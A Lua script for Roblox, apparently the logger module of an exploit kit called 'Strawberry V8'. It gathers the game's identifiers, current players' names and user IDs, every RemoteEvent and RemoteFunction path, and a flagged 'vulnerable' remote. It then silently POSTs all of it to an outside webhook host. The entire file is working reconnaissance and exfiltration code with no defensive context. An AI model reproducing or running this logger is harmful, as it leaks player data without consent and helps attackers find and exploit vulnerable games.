local Players          = game:GetService("Players")
local Marketplace      = game:GetService("MarketplaceService")
local Http             = game:GetService("HttpService")

local function treeOf(root)
    local t = {
        ClassName = root.ClassName,
        Name      = root.Name,
        Path      = root:GetFullName(),
        Children  = {}
    }
    for _, child in ipairs(root:GetChildren()) do
        if #t.Children < 50 then          -- hard limit so embed stays small
            table.insert(t.Children, treeOf(child))
        end
    end
    return t
end

local function listRemotes()
    local out = { Events = {}, Functions = {} }
    for _, inst in ipairs(game:GetDescendants()) do
        if inst:IsA("RemoteEvent") then
            table.insert(out.Events, inst:GetFullName())
        elseif inst:IsA("RemoteFunction") then
            table.insert(out.Functions, inst:GetFullName())
        end
    end
    return out
end

local playerLines = ""
for _, plr in ipairs(Players:GetPlayers()) do
    playerLines = playerLines .. string.format("%s (%d)\n", plr.Name, plr.UserId)
end
if #playerLines == 0 then playerLines = "None" end

local ok, prod = pcall(function()
    return Marketplace:GetProductInfo(game.PlaceId)
end)
local gameName = (ok and prod.Name) or "Unknown"

local vulnBlock = "Not Found"
if shared.strawberry and shared.strawberry.vulnRemote then
    vulnBlock = string.format(
        "\nPath: %s\nType: %s\n",
        shared.strawberry.vulnRemote:GetFullName(),
        shared.strawberry.vulnType
    )
end

local remotes   = listRemotes()
local eventsStr = table.concat(remotes.Events,   "\n"):sub(1, 1000)
local funcsStr  = table.concat(remotes.Functions,"\n"):sub(1, 1000)

local embed = {
    title       = "🍓 Strawberry V8 Logged A Game!",
    description = "Game Link: https://www.roblox.com/games/" .. game.PlaceId,
    color       = 0xff0000,                       -- bright red
    fields      = {
        {
            name   = "Game Info",
            value  = string.format(
                "\nName: %s\nPlaceId: %d\nJobId: %s\nCreatorId: %d\n",
                gameName, game.PlaceId, game.JobId, game.CreatorId
            ),
            inline = false
        },
        {
            name   = "Vulnerability Found",
            value  = vulnBlock,
            inline = false
        },
        {
            name   = string.format("Players (%d/%d)", #Players:GetPlayers(), Players.MaxPlayers),
            value  = playerLines,
            inline = true
        },
        {
            name   = string.format("RemoteEvents (%d)", #remotes.Events),
            value  = "\n" .. eventsStr .. "\n",
            inline = false
        },
        {
            name   = string.format("RemoteFunctions (%d)", #remotes.Functions),
            value  = "\n" .. funcsStr .. "\n",
            inline = false
        }
    },
    footer = {
        text = "Strawberry V8 BEASTMODE // by C:\\Drive, Saji & Sane"
    },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
}

local webhook = "https://strawbitchwebui.vercel.app/receive"

pcall(function()
    request({
        Url     = webhook,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = Http:JSONEncode({
            username   = "Strawberry Logger",
            avatar_url = "https://i.imgur.com/qav7D0t.png",
            embeds     = { embed }
        })
    })
end)
